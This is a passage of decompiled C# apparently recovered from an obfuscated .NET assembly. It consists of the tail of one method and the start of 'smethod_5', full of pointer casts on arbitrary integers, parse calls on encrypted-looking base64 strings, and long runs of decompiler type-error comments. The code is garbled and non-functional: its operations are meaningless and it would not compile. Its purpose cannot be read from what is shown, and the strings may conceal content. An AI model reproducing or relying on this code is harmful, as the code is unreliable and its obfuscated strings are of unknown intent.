		text = text;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s3);
		PropertyInfo[] propertyInfo_ = sbyte.TryParse(s3, numberStyles, ((ushort*)14928)->Equals(null) as IFormatProvider, out *(sbyte*)null) as PropertyInfo[];
		string s4 = text;
		string s5 = text;
		numberStyles = default(NumberStyles);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles style2);
		Type type = short.Parse(int.Parse(s4, byte.Parse(s5, style2) as IFormatProvider) as string) as Type;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type type2);
		type = type2;
		Type type_ = type;
		Type[] type_2 = array3;
		ParameterModifier[] parameterModifier_ = null;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out PropertyInfo[] propertyInfo_2);
		_ = (IFormatProvider)Class1.smethod_3(bindingFlags_2, propertyInfo_2, type_, type_2, parameterModifier_);
		IFormatProvider formatProvider = formatProvider;
		IFormatProvider provider = formatProvider;
		ref ulong result = ref *(ulong*)null;
		text = ulong.TryParse(s2, style, provider, out result) as string;
		_ = (Class3)(object)Class5.smethod_3();
		_ = (Class0)(object)Settings.Default;
		while (flag)
		{
			_003CModule_003E = null;
		}
		bool num4 = flag;
		object obj2 = text[312459143];
		System.Runtime.CompilerServices.Unsafe.SkipInit(out long num5);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out char c);
		checked
		{
			if (1 + unchecked(num4 / ((obj2 is bool) ? obj2 : null)) == 0)
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out long num6);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out long num8);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num11);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num10);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num12);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num13);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out long num14);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag3);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag4);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag5);
				while (true)
				{
					flag = false;
					if (flag2)
					{
						num5 = 729480115L;
						num5 = num6;
						long num7 = num5;
						num5 = num5;
						ulong num9 = unchecked((ulong)num7) + unchecked((ulong)num8);
						_ = short.Parse("do4+/5FUO8cL41jubTVQcUc4mwTtYVNqfrvjohcjSmIlG70xjten/xWP9XQEAaNvL32BOng=") is ushort;
						num10 = num10;
						unchecked
						{
							num10 = (ushort)((uint)num11 / 33852u);
							num10 = num10;
							num10 = num10;
							num10 = (ushort)checked(num12 + unchecked(103492u / (uint)num13));
							object obj3 = ((ushort*)num10)->GetTypeCode();
							object obj4 = ((obj3 is long) ? obj3 : null);
							num5 = num5;
							object obj5 = ((long*)num9)->Equals(checked(obj4 * num14));
							_ = ((byte*)((obj5 is byte) ? obj5 : null))->GetTypeCode() is long;
						}
					}
					else
					{
						object obj6 = short.Parse(text, numberStyles);
						uint num15;
						unchecked
						{
							flag = (byte)(int)((obj6 is bool) ? obj6 : null) != 0;
							text = text;
							_ = (byte)((ushort*)59267)->ToString(text2) != 0;
							flag = flag;
							num15 = (flag3 ? 1u : 0u) / (flag ? 1u : 0u);
							object obj7 = long.Parse(text, numberStyles);
							flag = (byte)(int)((obj7 is bool) ? obj7 : null) != 0;
						}
						if ((flag4 ? 1u : 0u) + unchecked(num15 / (flag5 ? 1u : 0u)) == 0)
						{
							break;
						}
					}
				}
			}
			System.Runtime.CompilerServices.Unsafe.SkipInit(out Resources resources);
			bool num16;
			string s6;
			object obj9;
			do
			{
				if (flag)
				{
					object obj8 = short.Parse("uwWl6PF4a1IumvBk4ibvAzlIO967FTOcYG5jEYMVnKyqGVuvSca8yJcZmM+bydIqIJyVVTc=", formatProvider);
					if (unchecked(((obj8 is bool) ? obj8 : null) / flag) == 0)
					{
						c = '䫝';
					}
				}
				else
				{
					resources = resources;
					resources = null;
				}
				num16 = char.IsSymbol(text, -417585379);
				s6 = text;
				obj9 = char.IsLetterOrDigit('彨');
			}
			while ((num16 ? 1u : 0u) + (ulong.TryParse(uint.Parse(s6, unchecked((NumberStyles)((obj9 is NumberStyles) ? obj9 : null))) as string, out result) ? 1u : 0u) != 0);
		}
		if (!flag)
		{
			long num17 = (long)((uint*)736720295)->ToString();
			char num18 = c;
			uint num19 = (uint)(sbyte)Settings.Default / 61u;
			string text3 = text;
			string text4 = text;
			int totalWidth = (int)/*isinst with value type is only supported in some contexts*/;
			object obj10 = char.IsLowSurrogate('ዀ');
			string value = text4.PadLeft(totalWidth, (char)checked(2 + ((obj10 is char) ? obj10 : null)));
			bindingFlags = default(BindingFlags);
			BindingFlags bindingFlags_3 = bindingFlags;
			Type[] type_3 = array3;
			uint num20;
			object obj11;
			checked
			{
				num20 = 53693u * unchecked((uint)(ushort)((sbyte*)54)->ToString(text));
				text = "RzAMF2MqKswiWBbxuNFs6ppx+xNDm2jz73tVmxvaFnWHpbt45/EP6csih/g1o8xslN3ZiNY=";
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string s7);
				obj11 = int.Parse(s7);
			}
			object obj12 = ushort.Parse("GRoglDBVquJ6W/8TPPqh0EhkQt6nHijQ2uU2GeYibPeQH0CSxTYsskxnC8up+F/+cDP90Js=", (NumberStyles)((obj11 is NumberStyles) ? obj11 : null), uint.TryParse(text, out *(uint*)null) as IFormatProvider);
			short num3 = (short)(int)((obj12 is short) ? obj12 : null);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out short num21);
			StringComparison stringComparison = (StringComparison)Class2.smethod_0(bindingFlags_3, null, type_3, ((ushort*)num20)->Equals(((short*)num21)->ToString(text, formatProvider)) as ParameterModifier[]);
			object obj13 = ((sbyte*)num19)->CompareTo((sbyte)(int)/*isinst with value type is only supported in some contexts*/);
			_003F val = checked(num18 + ((obj13 is char) ? obj13 : null));
			text = "qKINjtfRfkcTbz8rx411y7Z5hll5VgUhOb/Echv4HOLH09jVYOVgL/DmbjbJGvEEfQavQNI=";
			System.Runtime.CompilerServices.Unsafe.SkipInit(out string string_);
			object obj14 = char.TryParse(((bool*)checked(((unchecked((byte)Class5.smethod_0(string_)) != 0) ? 1u : 0u) + ((unchecked((byte)Class0.smethod_0()) != 0) ? 1u : 0u)))->GetHashCode() as string, out *(char*)null);
			object obj15 = ((obj14 is BindingFlags) ? obj14 : null);
			byte[] array4 = array4;
			NumberStyles style3 = (NumberStyles)Class1.smethod_0(null, array4);
			IFormatProvider provider2 = formatProvider;
			BindingFlags bindingFlags_4 = bindingFlags;
			nint intPtr = intPtr;
			object obj16 = uint.TryParse("OpnmmMCbIeVFscH/qHaoduBJElHITY69+AmFD80aNvOnEVrnmRGl2dhAB4X5RcxoxjTlUOU=", out *(uint*)null);
			object obj17 = default(IntPtr) == (IntPtr)((obj16 is IntPtr) ? obj16 : null);
			object obj18 = ((obj17 is byte) ? obj17 : null);
			BindingFlags bindingFlags_5 = bindingFlags;
			intPtr = default(IntPtr);
			object obj19 = (long)(IntPtr)checked(/*isinst with value type is only supported in some contexts*/ + intPtr);
			string s8 = ((short*)(short)Class2.smethod_2(bindingFlags_4, propertyInfo_, null, (Type[])(object)Class1.smethod_1((BindingFlags)((obj19 is BindingFlags) ? obj19 : null), array2, array3, parameterModifier_), parameterModifier_))->GetTypeCode() as string;
			IFormatProvider provider3 = formatProvider;
			object obj20 = ((short*)(short)((int*)(-282777816))->ToString("VAxZgr19QBnPoLNdDLWmDDmhW+8CtSLQDcCcBocG/QCWAyFsosO6JBOidcxWc+9s7cFcrWM=", formatProvider))->Equals(Class0.smethod_0());
			string s9 = long.TryParse(s8, default(NumberStyles), provider3, out *(long*)((obj20 is ref long) ? obj20 : null)) as string;
			ulong num22 = (ulong)Class0.smethod_0();
			ulong num23 = checked(94360376uL + num22);
			bindingFlags = bindingFlags;
			object obj21 = ((int*)/*isinst with value type is only supported in some contexts*/)->GetHashCode();
			if (checked((1u - (unchecked((bool*)((obj21 is bool) ? obj21 : null))->Equals(null) ? 1u : 0u)) * ((unchecked((byte)Class5.smethod_1((string)(object)Class0.smethod_0())) != 0) ? 1u : 0u)) == 0)
			{
				ulong num24 = 1460254176uL / num22;
				NumberStyles style4 = (NumberStyles)Class5.smethod_0(text);
				text = "gIuvXxhEeaUyoxapD1yyr6TFBSJE7yV+ZGPQfM43Dlqmp4C5fL98f8+ytlynYPogctCbvbc=";
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string s10);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ref byte result2);
				object obj22 = byte.TryParse(s10, out result2);
				object obj23 = sbyte.TryParse("QCu4Mmr8yZdPhez0NUBaKf5U4aJcBDphZZNJ88EMUW7mbiOj8ZrYCGdCYxYLvXpmHNH6KDQ=", style4, null, out *(sbyte*)((obj22 is ref sbyte) ? obj22 : null)) as object;
				object obj24 = ((ulong*)num24)->Equals(obj23);
				int bindingFlags_7 = (int)((obj24 is BindingFlags) ? obj24 : null);
				string s11 = text;
				object obj25 = int.Parse(((long*)num5)->ToString("yxtM/A2trqkxRhJH5Lb+MHzYJMiKn1tgUaDuTYNn5+cId5UxHtN+1JD70W+W751JvY5oz/c="), default(NumberStyles), formatProvider);
				short num25 = (short)Class2.smethod_0((BindingFlags)bindingFlags_7, long.Parse(s11, (NumberStyles)((obj25 is NumberStyles) ? obj25 : null), (flag ? ((bool*)1) : ((bool*)null))->Equals(obj23) as IFormatProvider) as MethodBase[], short.Parse(sbyte.Parse("N1gauJgmcke8bGKsRR4ILykh9ppFG5rlQPH9Ajf9KRVB8DMXLsrFR5ICwKhsaW9zlmGUvaA=") as string, null) as Type[], parameterModifier_);
				short num26 = num3;
				int num27 = num27;
				num3 = (short)checked(unchecked((uint)num25) - unchecked((uint)num26) * (unchecked((uint)(short)((uint*)(uint)((int*)checked(unchecked((uint)num27) - 1045320189u))->ToString(formatProvider))->ToString()) + unchecked((uint)(short)Settings.Default)));
			}
			else
			{
				flag = false;
			}
			return;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag6);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag7);
		while (true)
		{
			flag = false;
			flag = (byte)text.ToCharArray() != 0;
			flag = flag6;
			if (checked((flag7 ? 1u : 0u) * 1u - (flag ? 1u : 0u)) != 0)
			{
				do
				{
					ushort num10 = (ushort)(flag ? ((bool*)1) : ((bool*)null))->ToString();
				}
				while (flag);
				continue;
			}
			break;
		}
	}

	unsafe static void smethod_5()
	{
		//IL_001f: Expected O, but got I4
		//IL_003f: Expected O, but got I4
		//IL_0044: Expected I4, but got O
		//IL_0060: Expected O, but got I4
		//IL_0084: Expected I4, but got O
		//IL_00ba: Expected O, but got I4
		//IL_0170: Expected O, but got I4
		//IL_0183: Expected O, but got I4
		//IL_018f: Expected O, but got I4
		//IL_01ad: Expected O, but got I4
		//IL_01b3: Expected I8, but got O
		//IL_01bf: Expected O, but got I4
		//IL_01d3: Expected O, but got I4
		//IL_01dd: Expected O, but got I4
		//IL_01e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Expected I4, but got Unknown
		//IL_01f6: Expected O, but got I8
		//IL_022f: Expected O, but got I4
		//IL_0238: Expected I4, but got O
		//IL_0239: Expected O, but got I4
		//IL_023d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0240: Expected I, but got Unknown
		//IL_0282: Expected O, but got I4
		//IL_02a4: Expected O, but got I4
		//IL_02bf: Expected O, but got I4
		//IL_02c8: Expected I, but got O
		//IL_02c9: Expected O, but got I
		//IL_02cf: Expected I4, but got O
		//IL_02e9: Expected O, but got I4
		//IL_0319: Expected O, but got I4
		//IL_0324: Expected O, but got I4
		//IL_0355: Expected O, but got I4
		//IL_0379: Unknown result type (might be due to invalid IL or missing references)
		//IL_037a: Unknown result type (might be due to invalid IL or missing references)
		//IL_037b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0386: Unknown result type (might be due to invalid IL or missing references)
		//IL_0389: Expected I, but got Unknown
		//IL_0396: Expected O, but got I
		//IL_039c: Expected I4, but got O
		//IL_03a4: Expected O, but got I4
		//IL_03ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_03af: Unknown result type (might be due to invalid IL or missing references)
		//IL_03eb: Expected O, but got I4
		//IL_043f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0445: Unknown result type (might be due to invalid IL or missing references)
		//IL_0450: Expected Ref, but got Unknown
		//IL_0451: Expected O, but got I4
		//IL_0460: Expected O, but got I4
		//IL_046a: Expected O, but got I4
		//IL_04a3: Expected O, but got I4
		//IL_04b8: Expected O, but got I4
		//IL_04f6: Expected O, but got I4
		//IL_050d: Expected I4, but got O
		//IL_051a: Expected O, but got I4
		//IL_0523: Expected I8, but got O
		//IL_0524: Expected O, but got I4
		//IL_053c: Expected O, but got I4
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_054a: Expected Ref, but got Unknown
		//IL_0563: Expected O, but got I4
		//IL_0571: Unknown result type (might be due to invalid IL or missing references)
		//IL_05aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ee: Expected O, but got I4
		//IL_05fc: Expected O, but got I4
		//IL_0600: Unknown result type (might be due to invalid IL or missing references)
		//IL_0601: Unknown result type (might be due to invalid IL or missing references)
		//IL_0602: Unknown result type (might be due to invalid IL or missing references)
		//IL_060a: Expected I, but got Unknown
		//IL_060b: Expected O, but got I
		//IL_0628: Expected O, but got I4
		//IL_065c: Expected O, but got I4
		//IL_0661: Expected I4, but got O
		//IL_0689: Expected O, but got I
		//IL_069f: Expected O, but got I4
		//IL_06ab: Expected O, but got I4
		//IL_06d0: Expected O, but got I4
		//IL_06da: Expected O, but got I4
		//IL_06de: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_06fc: Expected Ref, but got Unknown
		//IL_06fd: Expected O, but got I4
		//IL_071a: Expected O, but got I4
		//IL_0740: Expected O, but got I4
		//IL_074b: Expected I4, but got O
		//IL_0765: Expected O, but got I4
		//IL_07aa: Expected O, but got I4
		//IL_07c0: Expected I4, but got O
		//IL_07c1: Expected O, but got I4
		//IL_07cc: Expected I4, but got O
		//IL_07cd: Expected O, but got I4
		//IL_07e4: Expected I4, but got O
		//IL_0823: Unknown result type (might be due to invalid IL or missing references)
		//IL_0843: Expected O, but got I4
		//IL_084c: Expected I4, but got Unknown
		//IL_084d: Expected O, but got I4
		//IL_087d: Expected O, but got I
		//IL_0887: Expected O, but got I4
		//IL_0894: Expected O, but got I4
		//IL_08a0: Expected O, but got I4
		//IL_08b4: Expected O, but got I4
		//IL_0910: Expected O, but got I4
		//IL_0916: Expected I, but got O
		//IL_091e: Expected O, but got I8
		//IL_0924: Expected I4, but got O
		//IL_0942: Expected O, but got I4
		//IL_094c: Expected O, but got I4
		//IL_0955: Unknown result type (might be due to invalid IL or missing references)
		//IL_095b: Expected Ref, but got Unknown
		//IL_095c: Expected O, but got I4
		//IL_099a: Expected O, but got I4
		//IL_09b7: Expected I4, but got O
		//IL_09b8: Expected O, but got I4
		//IL_09be: Expected I8, but got O
		//IL_09ca: Expected O, but got I4
		//IL_09e4: Expected O, but got I4
		//IL_09fa: Expected O, but got I4
		//IL_0a14: Expected I4, but got O
		//IL_0a42: Expected O, but got I4
		//IL_0a56: Expected O, but got I4
		//IL_0a72: Expected O, but got I4
		//IL_0a97: Expected O, but got I4
		//IL_0abd: Expected O, but got I8
		//IL_0ae4: Expected O, but got I
		//IL_0b04: Expected O, but got I4
		//IL_0b15: Expected O, but got I4
		//IL_0b25: Expected O, but got I4
		//IL_0b9c: Expected O, but got I4
		//IL_0ba6: Expected O, but got I4
		//IL_0bc1: Expected O, but got I4
		uint num;
		try
		{
			num = (uint)((bool*)1)->ToString();
			num = num;
		}
		catch
		{
			while (true)
			{
				_ = string.IsNullOrEmpty("Zp+by0vmXQ80RH4HkvkTWxheObx8ZeergpacufmaYgGG+wINB8rrcebQz18aGW0HVzkf2uk=") is Class1;
			}
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IntPtr intPtr);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out sbyte b);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out PropertyInfo[] propertyInfo_);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type type_);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out MethodBase[] array2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out MethodBase[] array3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] array5);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] type_5);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out long num11);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IntPtr intPtr2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IntPtr intPtr3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out CultureInfo cultureInfo);
		NumberStyles style;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref sbyte reference);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles style2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num14);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out PropertyInfo[] array7);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out PropertyInfo[] array);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IntPtr pointer);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text5);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] array8);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] parameterModifier_);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] array9);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] type_10);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] parameterModifier_3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out nint num18);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref ulong reference3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj8);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object value2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num21);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out MethodBase[] methodBase_7);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string value3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] array4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] array10);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] array11);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] parameterModifier_4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IntPtr intPtr6);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool ignoreCase);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string string_);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num23);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num24);
		string text;
		ulong num9;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] array6);
		long num8;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider);
		do
		{
			IL_08f2:
			text = (string)(object)Class0.smethod_0();
			style = default(NumberStyles);
			object obj2 = short.Parse(s, style, null);
			IntPtr num2 = (nint)((obj2 is IntPtr) ? obj2 : null);
			object obj3 = ((IntPtr*)intPtr)->ToInt64();
			BindingFlags bindingFlags = (BindingFlags)((obj3 is BindingFlags) ? obj3 : null);
			array = array;
			Type type = null;
			object obj4 = short.Parse(((sbyte*)b)->GetTypeCode() as string);
			if ((byte)Class1.smethod_3(default(BindingFlags), propertyInfo_, type_, null, ((int*)(((obj4 is int) ? obj4 : null) / checked(unchecked((uint)num3) - unchecked((uint)num3))))->GetTypeCode() as ParameterModifier[]) != 0)
			{
				try
				{
					object obj5 = ((long*)384967790L)->CompareTo(33530992L);
					num = (uint)(int)((obj5 is uint) ? obj5 : null);
				}
				finally
				{
					style = default(NumberStyles);
					object obj6 = uint.Parse("3rc2Ka3n1Gc9T3R16khtoR7AbI5PcEVxwDhFLLYNykgqdq2i7atgsEm69ZHC7p7HirUMV3M=", style, null);
					object obj7 = ((obj6 is BindingFlags) ? obj6 : null);
					array2 = array2;
					array2 = array3;
					MethodBase[] methodBase_ = array2;
					Type[] type_2 = (Type[])(object)((bool*)1)->ToString(null);
					array4 = array4;
					array4 = array5;
					bindingFlags = (BindingFlags)Class2.smethod_0((BindingFlags)obj7, methodBase_, type_2, array4);
					BindingFlags bindingFlags_ = bindingFlags;
					MethodBase[] methodBase_2 = array2;
					bindingFlags = default(BindingFlags);
					BindingFlags bindingFlags_2 = bindingFlags;
					BindingFlags bindingFlags_3 = bindingFlags;
					MethodBase[] methodBase_3 = array2;
					sbyte num4 = (sbyte)Class1.smethod_0(null, null);
					text = (((byte)Class0.smethod_0() != 0) ? ((bool*)1) : ((bool*)null))->GetTypeCode() as string;
					Type[] type_3 = (Type[])(object)((sbyte*)num4)->ToString(text, null);
					BindingFlags bindingFlags_4 = bindingFlags;
					IntPtr num5;
					checked
					{
						uint c = 30321u * unchecked((uint)(char)Settings.Default);
						num2 = default(IntPtr);
						num5 = num2;
					}
					int num6 = (int)Class2.smethod_0(bindingFlags, null, null, array4);
					bindingFlags = default(BindingFlags);
					BindingFlags bindingFlags_5 = bindingFlags;
					array6 = array6;
					sbyte num7 = (sbyte)Class2.smethod_0(bindingFlags_5, null, array6, null);
					BindingFlags bindingFlags_6 = bindingFlags;
					type = type;
					Type type_4 = type;
					array6 = array6;
					num8 = (long)Class1.smethod_3(bindingFlags_6, null, type_4, type_5, null);
					num9 = (ulong)((long*)num8)->ToString("BATXqpLpHtFSAXAE0Jb0WYOIhiwDcXVOnFHbB/vOpg6pCP4yWafPJFNUkIzBZc2h74kVwzI=");
					bool num10 = (byte)((ulong*)num9)->ToString(text) != 0;
					obj8 = Settings.Default;
					object obj9 = (num10 ? ((bool*)1) : ((bool*)null))->CompareTo(obj8);
					object obj10 = ((ulong*)((obj9 is ulong) ? obj9 : null))->CompareTo(1762860442uL);
					object obj11 = ((obj10 is uint) ? obj10 : null);
					string obj12 = ((IntPtr*)num2)->GetHashCode() as string;
					text = text;
					text = text2;
					object obj13 = long.TryParse(s2, out *(long*)null);
					num8 = (long)((obj13 is long) ? obj13 : null);
					object obj14 = ((int*)num6)->Equals(((sbyte*)num7)->CompareTo((sbyte)((uint*)obj11)->ToString(obj12, ((long*)checked(578452256uL * (unchecked((ulong)num11) - unchecked((ulong)num8))))->GetHashCode() as IFormatProvider)) as object);
					num3 = checked(607321287 + ((obj14 is int) ? obj14 : null));
					_ = (IntPtr)((int*)num3)->ToString(((IntPtr*)(IntPtr)Class0.smethod_0())->ToInt64() as string);
					num2 = (IntPtr)Class5.smethod_2();
					num2 = intPtr2;
					nuint num12 = (nuint)(nint)num5 / (nuint)unchecked((nint)default(IntPtr));
					object obj15 = char.ToUpperInvariant((char)(int)/*isinst with value type is only supported in some contexts*/);
					num2 = (nint)checked(num12 - ((obj15 is IntPtr) ? obj15 : null));
					num2 = intPtr3;
					string text3 = text;
					cultureInfo = cultureInfo;
					string strA = text3.ToUpper(cultureInfo);
					string text4 = text;
					string s3 = (string)(object)Class0.smethod_0();
					style = style;
					reference = ref reference;
					formatProvider = sbyte.TryParse(s3, style2, null, out reference) as IFormatProvider;
					object obj16 = char.IsUpper("+TGR5meQYjACVKhoX+mGl30TKLpubJN9cKpFLsuA49iBgWjwKAxvdVCAUwUgUeB6OtX+JjU=", (int)text4.Split((char[])(object)((short*)(-2719))->ToString(formatProvider)));
					object obj17 = ((obj16 is int) ? obj16 : null);
					num2 = default(IntPtr);
					IntPtr num13 = num2;
					object obj18 = ((IntPtr*)num2)->GetHashCode();
					object obj19 = (nint)(IntPtr)(void*)(nint)((obj18 is void*) ? obj18 : null);
					bindingFlags = (BindingFlags)((obj19 is BindingFlags) ? obj19 : null);
					bindingFlags = bindingFlags2;
					num14 = num14;
					array = ((ushort*)num14)->GetTypeCode() as PropertyInfo[];
					array = array7;
					array = null;
					PropertyInfo[] propertyInfo_2 = array;
					Type[] type_6 = array6;
					IFormatProvider provider = formatProvider;
					text = text;
					object obj20 = sbyte.Parse(text);
					string value = ((uint*)((obj20 is uint) ? obj20 : null))->CompareTo(null) as string;
					num2 = default(IntPtr);
					IntPtr intPtr4 = num2;
					num2 = num2;
					object obj21 = sbyte.Parse("u0ACvOucd4ugDBBIIqR/BRjkDRKSVihmmaeBnAmdMH5cUAXlXiQRuRK4Jo2zW86dyuVAO5E=", default(NumberStyles), null);
					num2 = (nint)(checked(unchecked((nuint)(nint)intPtr4) + (unchecked((nuint)unchecked((nint)default(IntPtr))) + unchecked(((obj21 is IntPtr) ? obj21 : null) / ((nuint)unchecked((nint)default(IntPtr)) / checked(unchecked((nuint)unchecked((nint)default(IntPtr))) * unchecked((nuint)unchecked((nint)default(IntPtr)))))))) / (nuint)unchecked((nint)default(IntPtr)));
					object obj22 = (nint)IntPtr.Subtract(pointer, -973712361);
					StringComparison comparisonType = (StringComparison)((obj22 is StringComparison) ? obj22 : null);
					object obj23 = text5.EndsWith(value, comparisonType);
					_003F val = ((obj23 is uint) ? obj23 : null) / 808231000 / num;
					BindingFlags bindingFlags_7 = (BindingFlags)Class5.smethod_2();
					array = null;
					ulong num15 = 18446744073593013674uL / checked(18446744072569065563uL * (18446744072430186404uL * unchecked((ulong)num8)));
					text = text;
					Type type_7 = (Type)(object)((long*)num15)->ToString(ushort.Parse(s4) as IFormatProvider);
					bindingFlags = (BindingFlags)((bool*)null)->ToString(null);
					MethodBase[] methodBase_4 = array2;
					Type[] type_8 = array6;
					BindingFlags bindingFlags_8 = bindingFlags;
					MethodBase[] methodBase_5 = array2;
					Type[] type_9 = array6;
					array4 = array4;
					array4 = array8;
					array4 = (ParameterModifier[])(object)Class2.smethod_0(bindingFlags_8, methodBase_5, type_9, parameterModifier_);
					object obj24 = ((byte*)/*isinst with value type is only supported in some contexts*/)->Equals(183);
					object obj25 = uint.TryParse("ZVqlNjMJmMsNcynp/YvzcJpUL9QCcbBKEoRKgZBAbEnmOBcv4GYL+fdxf6tF0h5NbRakjhY=", default(NumberStyles), provider, out *(uint*)((obj24 is ref uint) ? obj24 : null));
					object obj26 = ((obj25 is BindingFlags) ? obj25 : null);
					string s5 = text;
					bindingFlags = bindingFlags;
					long num16 = (long)((byte*)198)->ToString();
					object obj27 = uint.Parse(((ushort*)(ushort)((uint*)num)->ToString())->GetHashCode() as string, (NumberStyles)string.Concat<T>((IEnumerable<T>)null));
					object obj28 = ((obj27 is BindingFlags) ? obj27 : null);
					MethodBase[] methodBase_6 = array2;
					flag = true;
					array6 = ((bool*)1)->CompareTo((byte)((long*)(long)Class0.smethod_0())->ToString((IFormatProvider)Class1.smethod_1(bindingFlags, array2, (Type[])(object)Class1.smethod_2(text), array4)) != 0) as Type[];
					array6 = array9;
					array4 = array4;
					ref _003F reference2 = ref *(_003F*)num16;
					object obj29 = ((long*)(long)Class2.smethod_0((BindingFlags)obj28, methodBase_6, type_10, parameterModifier_3))->CompareTo(num8);
					PropertyInfo[] propertyInfo_4 = System.Runtime.CompilerServices.Unsafe.As<_003F, long>(ref reference2).CompareTo((long)((obj29 is long) ? obj29 : null)) as PropertyInfo[];
					uint num17;
					checked
					{
						num17 = unchecked((uint)num3) + (unchecked((uint)num3) - 1926748712u);
					}
					object obj30 = byte.TryParse(text, out *(byte*)null);
					IntPtr intPtr5 = (IntPtr)((int*)(num17 / ((obj30 is int) ? obj30 : null)))->ToString(text, formatProvider);
					object obj31 = text.EndsWith(text, (StringComparison)Class0.smethod_0());
					_003F val3;
					nint num19;
					byte num20;
					checked
					{
						_003F val2 = ((obj31 is IntPtr) ? obj31 : null) - unchecked((nuint)unchecked((nint)default(IntPtr)));
						num2 = default(IntPtr);
						num2 = default(IntPtr);
						val3 = unchecked((nuint)(nint)intPtr5) - (val2 + (unchecked((nuint)num18) - unchecked((nuint)(nint)(IntPtr)((long*)717283539L)->ToString((string)(object)Class0.smethod_0()))));
						num2 = default(IntPtr);
						num19 = num2;
						num20 = byte.Parse(text, default(NumberStyles), formatProvider);
						string s6 = text;
						reference3 = ref reference3;
						obj8 = ulong.TryParse(s6, default(NumberStyles), null, out reference3) as object;
					}
					object obj32 = ((byte*)num20)->CompareTo(value2);
					b = (sbyte)Class1.smethod_3(default(BindingFlags), propertyInfo_4, ((nint)((IntPtr)(val3 / checked(unchecked((nuint)unchecked((nint)default(IntPtr))) * (num19 + ((obj32 is IntPtr) ? obj32 : null)))) - num3)) as Type, null, null);
					object obj33 = ((sbyte*)((uint)b / (uint)b))->GetTypeCode();
